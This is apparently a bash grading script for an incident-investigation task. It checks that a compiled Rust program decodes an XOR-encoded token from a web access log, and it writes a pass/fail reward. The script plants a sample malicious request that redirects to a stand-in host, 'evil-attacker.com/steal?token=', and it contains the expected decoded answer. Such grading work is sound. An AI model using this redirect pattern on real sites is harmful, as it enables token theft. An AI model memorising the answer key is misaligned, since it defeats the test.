#!/bin/bash
mkdir -p /logs/verifier

WORK_DIR=$(mktemp -d /tmp/investigate-verifier.XXXXXX)
cp /home/user/access.log "$WORK_DIR/access.log.original"
cp /home/user/auth_lib.rs "$WORK_DIR/auth_lib.rs.original"

restore_files() {
    cp "$WORK_DIR/access.log.original" /home/user/access.log 2>/dev/null || true
    cp "$WORK_DIR/auth_lib.rs.original" /home/user/auth_lib.rs 2>/dev/null || true
}
trap 'restore_files; rm -rf "$WORK_DIR"' EXIT

verify_all() {
    test -f /home/user/investigate.rs || return 1

    rustc --edition=2021 /home/user/investigate.rs -o "$WORK_DIR/investigate_bin" || return 1

    # Remove any precomputed answer and require the compiled program to recreate it.
    rm -f /home/user/decoded_payload.txt
    timeout 15s "$WORK_DIR/investigate_bin" || return 1

    python3 - <<'PY' || return 1
from pathlib import Path
path = Path('/home/user/decoded_payload.txt')
assert path.is_file(), f'The file {path} was not created by the compiled program.'
expected = '{"user": "admin", "privilege": "escalated"}'
assert path.read_text() == expected, 'The compiled program did not decode the original token correctly.'
PY

    # Exercise the same parser and inverse algorithm on a fresh payload so a
    # hardcoded original answer cannot pass.
    python3 - <<'PY' || return 1
import json
import secrets
from pathlib import Path
payload = json.dumps({
    'user': 'probe_' + secrets.token_hex(8),
    'privilege': 'audit',
    'nonce': secrets.randbelow(1_000_000_000),
}, separators=(',', ':'))
token = ''.join(f'{ord(ch) ^ 0x4b:02x}' for ch in payload)
Path('/home/user/access.log').write_text(
    '203.0.113.4 - - [11/Oct/2023:09:10:00 +0000] "GET /login HTTP/1.1" 200 120\n'
    '198.51.100.9 - - [11/Oct/2023:09:11:00 +0000] "GET /login?redirect=http://evil-attacker.com/steal?token='
    + token + ' HTTP/1.1" 302 -\n'
    '203.0.113.8 - - [11/Oct/2023:09:12:00 +0000] "GET /dashboard HTTP/1.1" 200 321\n'
)
PY

    rm -f /home/user/decoded_payload.txt
    timeout 15s "$WORK_DIR/investigate_bin" || return 1

    python3 - <<'PY' || return 1
import re
from pathlib import Path
log = Path('/home/user/access.log').read_text()
match = re.search(r'evil-attacker\.com/[^\s"]*[?&]token=([0-9a-fA-F]+)', log)
assert match, 'Verifier-generated malicious request is missing.'
raw = bytes.fromhex(match.group(1))
expected = bytes(value ^ 0x4b for value in raw).decode('utf-8')
output = Path('/home/user/decoded_payload.txt')
assert output.is_file(), 'The compiled program did not create decoded_payload.txt for the fresh log.'
assert output.read_text() == expected, 'The compiled program failed to parse and decode the fresh log token.'
PY

    # Restore the supplied incident and require the final artifact to represent it.
    restore_files
    rm -f /home/user/decoded_payload.txt
    timeout 15s "$WORK_DIR/investigate_bin" || return 1

    cat <<'TEST_EOF' > "$WORK_DIR/test_final_state.py"
import os
import pytest

def test_investigate_script_exists():
    script_path = "/home/user/investigate.rs"
    assert os.path.isfile(script_path), f"The script {script_path} was not created."

def test_decoded_payload_exists_and_correct():
    payload_path = "/home/user/decoded_payload.txt"
    assert os.path.isfile(payload_path), f"The file {payload_path} was not created."

    with open(payload_path, 'r') as f:
        content = f.read()

    expected_payload = '{"user": "admin", "privilege": "escalated"}'
    assert content == expected_payload, f"The decoded payload is incorrect. Expected '{expected_payload}', got '{content}'."
TEST_EOF

    python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider "$WORK_DIR/test_final_state.py" -x --tb=short 2>&1 || return 1
}

if verify_all; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
